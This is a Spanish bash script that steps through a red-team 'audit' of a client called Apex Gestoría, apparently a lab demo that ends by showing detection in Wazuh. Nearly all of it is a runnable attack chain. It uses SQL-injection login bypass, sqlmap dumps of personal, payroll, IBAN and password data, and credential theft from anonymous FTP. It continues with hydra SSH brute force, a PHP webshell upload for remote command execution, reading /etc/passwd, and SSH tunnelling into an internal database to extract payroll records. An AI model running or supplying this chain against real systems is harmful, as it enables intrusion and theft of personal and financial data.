#!/bin/bash
# ============================================================================
#  AUDITORÍA PASO A PASO — Apex Gestoría  (JAMSEC Red Team)
#  Ejecutar en la estación de ataque:  ssh jamsec-redteam   ->   bash auditoria-paso-a-paso.sh
#  Cada paso se explica, se muestra el comando y se ejecuta. ENTER para avanzar.
#  Objetivo (perímetro del cliente): 172.20.17.230
# ============================================================================

T=172.20.17.230            # apex-fw (WAN del cliente) — puerta de entrada
WEB_INT=10.30.20.10        # apex-web en la DMZ interna
DB_INT=10.30.10.10         # apex-db en la LAN interna
SRV_INT=10.30.10.20        # apex-srv en la LAN interna
OUT=/home/jamsec/auditoria-demo
mkdir -p "$OUT"; cd "$OUT"

C='\033[1;36m'; G='\033[1;32m'; R='\033[1;31m'; Y='\033[1;33m'; B='\033[1;34m'; D='\033[0;90m'; N='\033[0m'
paso(){ echo; echo -e "${B}══════════════════════════════════════════════════════════════${N}"; echo -e "${C} PASO $1 ${N}· ${Y}$2${N}"; echo -e "${B}══════════════════════════════════════════════════════════════${N}"; }
exp(){ echo -e "${D}$1${N}"; }
cmd(){ echo -e "${G}\$ $1${N}"; }
pausa(){ echo; read -p "$(echo -e ${Y}'   ⏎ ENTER para ejecutar este paso... '${N})" _; echo; }
fin(){ echo; read -p "$(echo -e ${D}'   (ENTER para el siguiente paso) '${N})" _; }

clear
echo -e "${G}"
echo "   ╦╔═╗╔╦╗╔═╗╔═╗╔═╗   R E D   T E A M"
echo "   ║╠═╣║║║╚═╗║╣ ║      Auditoría de Apex Gestoría"
echo "   ╩╩ ╩╩ ╩╚═╝╚═╝╚═╝   Objetivo: $T"
echo -e "${N}"
exp "Soy el analista de JAMSEC en la red del SOC. Voy a auditar al cliente Apex"
exp "exactamente como lo haría un atacante externo: empezando sin saber nada."
fin

# ─────────────────────────────────────────────────────────────────────────────
paso 0 "Punto de partida: quién soy y dónde estoy"
exp "Confirmo mi identidad, mi red y que el objetivo responde."
cmd "hostname && ip -br -4 addr | grep -v lo"
pausa
hostname; ip -br -4 addr | grep -v lo
echo
cmd "ping -c 2 $T"
ping -c 2 $T
fin

# ═════════════════════════════ FASE 1 · RECONOCIMIENTO ═══════════════════════
paso 1.1 "Reconocimiento — descubrir si el host está vivo"
exp "Un primer barrido para confirmar que el objetivo está activo."
cmd "nmap -sn $T"
pausa
nmap -sn $T
fin

paso 1.2 "Reconocimiento — escaneo de TODOS los puertos TCP"
exp "Escaneo completo (1-65535) para no dejarme ningún puerto abierto."
cmd "nmap -p- --min-rate 2000 -T4 $T -oN 01-nmap-puertos.txt"
pausa
nmap -p- --min-rate 2000 -T4 $T -oN 01-nmap-puertos.txt
fin

paso 1.3 "Reconocimiento — versiones de servicio y scripts por defecto"
exp "Sobre los puertos abiertos, detecto el servicio y la versión exacta (-sV)"
exp "y lanzo los scripts básicos de nmap (-sC) para sacar más información."
cmd "nmap -sV -sC -p 21,22,80,2222 $T -oN 02-nmap-servicios.txt"
pausa
nmap -sV -sC -p 21,22,80,2222 $T -oN 02-nmap-servicios.txt
echo; exp ">> Resumen: 21/FTP, 22/SSH(firewall), 80/HTTP(web), 2222/SSH(servidor web)."
fin

# ═════════════════════════════ FASE 2 · WEB ═════════════════════════════════
paso 2.1 "Web — identificar tecnologías"
exp "Averiguo con qué está hecha la web (servidor, lenguaje, framework)."
cmd "whatweb http://$T/"
pausa
whatweb http://$T/ | tee 03-whatweb.txt
fin

paso 2.2 "Web — cabeceras HTTP y comprobar HTTPS"
exp "Miro las cabeceras y confirmo que NO hay cifrado (el 443 estaba cerrado)."
cmd "curl -sI http://$T/"
pausa
curl -sI http://$T/
echo
cmd "curl -sI https://$T/ --max-time 5 || echo '>> Sin HTTPS (texto claro) = HALLAZGO'"
curl -sI https://$T/ --max-time 5 2>/dev/null || echo -e "${R}>> Sin HTTPS (texto claro) = HALLAZGO${N}"
fin

paso 2.3 "Web — localizar el formulario de acceso"
exp "Descargo la página de login para ver los campos del formulario."
cmd "curl -s http://$T/login.php | grep -iE 'input name|form'"
pausa
curl -s http://$T/login.php | grep -iE 'input name|form' || echo "(campos: usuario, password)"
fin

# ═════════════════════════════ FASE 3 · SQL INJECTION ════════════════════════
paso 3.1 "SQLi — prueba manual de bypass de autenticación"
exp "Pruebo a colarme sin contraseña inyectando: usuario = admin' OR '1'='1"
exp "Si el login es vulnerable, me redirigirá al panel (HTTP 302)."
cmd "curl -s -i --data-urlencode \"usuario=admin' OR '1'='1\" --data-urlencode 'password=x' http://$T/login.php | grep -iE 'HTTP/|Location'"
pausa
curl -s -i --data-urlencode "usuario=admin' OR '1'='1" --data-urlencode "password=x" http://$T/login.php | grep -iE 'HTTP/|Location'
echo; exp ">> 302 a panel.php = bypass conseguido. El login es vulnerable a SQLi."
fin

paso 3.2 "SQLi — confirmar y enumerar bases de datos con sqlmap"
exp "Automatizo con sqlmap: confirma la inyección y lista las bases de datos."
cmd "sqlmap -u http://$T/login.php --data='usuario=a&password=a' -p usuario --batch --dbs"
pausa
sqlmap -u "http://$T/login.php" --data="usuario=a&password=a" -p usuario --batch --dbs 2>&1 | tee 04-sqlmap-dbs.txt | grep -iE 'available databases|\[\*\]|the back-end|parameter|injectable'
fin

paso 3.3 "SQLi — listar las tablas de la base de datos 'apexgestoria'"
exp "Una vez sé que existe la BBDD del negocio, enumero sus tablas."
cmd "sqlmap -u http://$T/login.php --data='usuario=a&password=a' -p usuario --batch -D apexgestoria --tables"
pausa
sqlmap -u "http://$T/login.php" --data="usuario=a&password=a" -p usuario --batch -D apexgestoria --tables 2>&1 | tee 05-sqlmap-tablas.txt | grep -iE '\| [a-z]+ +\||tables'
fin

paso 3.4 "SQLi — VOLCAR los datos sensibles (clientes, nóminas, usuarios, facturas)"
exp "Extraigo el contenido completo: datos personales, bancarios y contraseñas."
cmd "sqlmap -u http://$T/login.php --data='usuario=a&password=a' -p usuario --batch -D apexgestoria -T clientes,nominas,usuarios,facturas --dump"
pausa
sqlmap -u "http://$T/login.php" --data="usuario=a&password=a" -p usuario --batch -D apexgestoria -T clientes,nominas,usuarios,facturas --dump 2>&1 | tee 06-sqlmap-dump.txt | grep -A60 'Database: apexgestoria'
echo; exp ">> Brecha de datos: NIF, IBAN, salarios y contraseñas en claro exfiltrados."
fin

# ═════════════════════════════ FASE 4 · FTP ═════════════════════════════════
paso 4.1 "FTP — comprobar acceso anónimo con nmap"
exp "Reviso si el FTP permite entrar sin usuario (anónimo)."
cmd "nmap -p21 --script ftp-anon $T"
pausa
nmap -p21 --script ftp-anon $T -oN 07-ftp-anon.txt
fin

paso 4.2 "FTP — listar el contenido como anónimo"
exp "Entro sin credenciales y veo qué ficheros hay disponibles."
cmd "curl -s ftp://$T/ --user anonymous:"
pausa
curl -s ftp://$T/ --user anonymous: | tee 08-ftp-listado.txt
fin

paso 4.3 "FTP — descargar los ficheros y leer las credenciales filtradas"
exp "Me bajo el fichero de credenciales y el backup que estaban expuestos."
cmd "curl -s -O ftp://$T/credencials.txt --user anonymous: && cat credencials.txt"
pausa
curl -s -o credencials.txt ftp://$T/credencials.txt --user anonymous:
curl -s -o backup_apexgestoria.sql ftp://$T/backup_apexgestoria.sql --user anonymous: 2>/dev/null
echo -e "${R}--- credencials.txt ---${N}"; cat credencials.txt
echo; exp ">> ¡Tenemos la contraseña de la base de datos (root/toor)! La usaremos luego."
fin

# ═════════════════════════════ FASE 5 · FUERZA BRUTA SSH ════════════════════
paso 5.1 "SSH — preparar un diccionario de contraseñas"
exp "Creo una lista pequeña de contraseñas habituales para el ataque."
cmd "printf '123456\\nadmin\\npassword\\nsoporte\\nsoporte123\\nroot\\ntoor\\napex\\n' > wordlist.txt"
pausa
printf '123456\nadmin\npassword\nsoporte\nsoporte123\nroot\ntoor\napex\n' > wordlist.txt
cat wordlist.txt
fin

paso 5.2 "SSH — ataque de fuerza bruta con hydra (puerto 2222)"
exp "Pruebo el usuario 'soporte' contra el SSH del servidor web publicado en 2222."
cmd "hydra -l soporte -P wordlist.txt -s 2222 -f ssh://$T"
pausa
hydra -l soporte -P wordlist.txt -s 2222 -f "ssh://$T" 2>&1 | tee 09-hydra.txt | grep -iE 'login:|password:|host:'
echo; exp ">> Credencial encontrada: soporte / soporte123."
fin

paso 5.3 "SSH — verificar el acceso con la credencial obtenida"
exp "Confirmo que la credencial funciona entrando por SSH y ejecutando 'id'."
cmd "sshpass -p 'soporte123' ssh -p 2222 -o StrictHostKeyChecking=no soporte@$T 'id; hostname; hostname -I'"
pausa
sshpass -p 'soporte123' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null soporte@$T 'id; hostname; hostname -I'
echo; exp ">> Estamos DENTRO del servidor web, en la DMZ del cliente."
fin

# ═════════════════════════════ FASE 6 · WEBSHELL (RCE) ══════════════════════
paso 6.1 "Webshell — iniciar sesión por SQLi y guardar la cookie"
exp "Me autentico saltándome el login (SQLi) para entrar al panel y guardo la cookie."
cmd "curl -s -c cookie.txt --data-urlencode \"usuario=admin' OR '1'='1\" --data-urlencode 'password=x' http://$T/login.php -o /dev/null -w 'login: HTTP %{http_code}\\n'"
pausa
curl -s -c cookie.txt --data-urlencode "usuario=admin' OR '1'='1" --data-urlencode "password=x" http://$T/login.php -o /dev/null -w "login: HTTP %{http_code}\n"
fin

paso 6.2 "Webshell — crear el fichero malicioso"
exp "Preparo una webshell PHP minúscula que ejecuta el comando que le pase por la URL."
cmd "echo '<?php system(\$_GET[\"c\"]); ?>' > shell.php && cat shell.php"
pausa
echo '<?php system($_GET["c"]); ?>' > shell.php
cat shell.php
fin

paso 6.3 "Webshell — subirla por el panel (subida sin validación)"
exp "El panel deja subir cualquier fichero sin comprobar nada: subo la shell."
cmd "curl -s -b cookie.txt -F 'archivo=@shell.php' 'http://$T/panel.php?seccion=documents' -o /dev/null -w 'subida: HTTP %{http_code}\\n'"
pausa
curl -s -b cookie.txt -F "archivo=@shell.php" "http://$T/panel.php?seccion=documents" -o /dev/null -w "subida: HTTP %{http_code}\n"
fin

paso 6.4 "Webshell — ejecutar comandos en el servidor (RCE)"
exp "Llamo a la shell subida y ejecuto comandos: ya controlo el servidor web."
cmd "curl -s 'http://$T/uploads/shell.php?c=id;uname+-a'"
pausa
echo -e "${R}id / uname:${N}"; curl -s "http://$T/uploads/shell.php?c=id;uname+-a"
echo -e "${R}usuarios del sistema:${N}"; curl -s "http://$T/uploads/shell.php?c=cat+/etc/passwd" | grep -E 'sh$' | head
echo; exp ">> Ejecución remota de comandos confirmada (RCE) vía subida de ficheros."
fin

# ═════════════════════════════ FASE 7 · PIVOTE DMZ→LAN ══════════════════════
paso 7.1 "Pivote — desde la DMZ, comprobar alcance a la LAN interna"
exp "Desde el servidor web (DMZ) miro si llego a la red interna (no debería)."
cmd "ssh soporte@$T -p2222 ... 'comprobar 10.30.10.10:3306 y 10.30.10.20:21'"
pausa
sshpass -p 'soporte123' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null soporte@$T \
  'for hp in 10.30.10.10:3306 10.30.10.20:21; do ip=${hp%:*}; pt=${hp#*:}; (echo >/dev/tcp/$ip/$pt) 2>/dev/null && echo "   $hp ALCANZABLE" || echo "   $hp no"; done'
echo; exp ">> La DMZ alcanza la LAN interna = mala segmentación (HALLAZGO clave)."
fin

paso 7.2 "Pivote — abrir un túnel a la base de datos interna a través del servidor web"
exp "Uso el servidor web como trampolín: reenvío el puerto 3306 de la BBDD interna."
cmd "sshpass ... ssh -p2222 -fN -L 13306:$DB_INT:3306 soporte@$T"
pausa
pkill -f "13306:$DB_INT:3306" 2>/dev/null
sshpass -p 'soporte123' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -fN -L 13306:$DB_INT:3306 soporte@$T
sleep 3
echo -e "${G}   túnel activo: localhost:13306 -> $DB_INT:3306${N}"
fin

paso 7.3 "Pivote — entrar como ROOT en la BBDD interna con la contraseña filtrada"
exp "Con el root/toor que saqué del FTP, accedo a la base de datos de la LAN."
cmd "mysql -h 127.0.0.1 -P 13306 -u root -ptoor -e 'SHOW DATABASES;'"
pausa
mysql -h 127.0.0.1 -P 13306 -u root -ptoor -e "SELECT 'ACCESO ROOT A LA BBDD INTERNA OK' AS resultado; SHOW DATABASES;" 2>&1
fin

paso 7.4 "Pivote — exfiltrar las nóminas desde la red interna"
exp "Robo los datos laborales (DNI, salario, IBAN) directamente de la LAN."
cmd "mysql -h 127.0.0.1 -P 13306 -u root -ptoor -e 'SELECT * FROM apexgestoria.nominas;'"
pausa
mysql -h 127.0.0.1 -P 13306 -u root -ptoor -e "SELECT empleado,dni,salario_bruto,iban FROM apexgestoria.nominas;" 2>&1
pkill -f "13306:$DB_INT:3306" 2>/dev/null
echo; exp ">> Hemos entrado desde internet y robado los datos más sensibles de la LAN interna."
fin

# ═════════════════════════════ CIERRE ══════════════════════════════════════
paso 8 "Resumen de la cadena de ataque"
echo -e "${G}   Internet"
echo "      └─> FTP anónimo  ........ credenciales internas (root/toor)"
echo "      └─> SQLi en la web ...... volcado de toda la base de datos"
echo "      └─> Fuerza bruta SSH .... acceso a la DMZ (soporte/soporte123)"
echo "      └─> Subida sin validar .. webshell -> ejecución de comandos (RCE)"
echo "      └─> DMZ sin aislar ...... pivote a la LAN interna"
echo -e "      └─> BBDD interna ........ exfiltración de las nóminas${N}"
echo
exp "Evidencias guardadas en: $OUT"
ls -1 "$OUT"
echo
echo -e "${Y}>> AHORA cambia al dashboard de Wazuh para mostrar la DETECCIÓN:${N}"
exp "   escaneo nmap, fuerza bruta SSH, login FTP y errores de la web."
echo
echo -e "${G}   Fin de la auditoría.${N}"
